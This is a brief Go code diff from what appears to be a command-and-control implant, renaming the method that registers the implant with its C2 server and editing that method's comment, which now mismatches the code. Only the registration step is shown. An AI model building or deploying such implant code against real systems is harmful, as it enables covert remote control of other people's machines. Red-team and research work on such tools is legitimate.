@@ -32,7 +32,7 @@ func NewImplant() (*Implant, error) {
 		TaskQueue:  NewTaskQueue(),
 	}
 
-	protocol, err := impl.register()
+	protocol, err := impl.new()
 	if err != nil {
 		return nil, fmt.Errorf("implant registration failed: %w", err)
 	}
@@ -46,8 +46,8 @@ func NewImplant() (*Implant, error) {
 	return impl, nil
 }
 
-// register contacts the /register endpoint, fills impl.ID, and returns the c2's chosen communication protocol
-func (i *Implant) register() (string, error) {
+// register contacts the /new, fills impl.ID, and returns the c2's chosen communication protocol
+func (i *Implant) new() (string, error) {
 	const endpoint = C2HTTPSURI + C2REGISTERENDPOINT
 
 	body, err := json.Marshal(i)
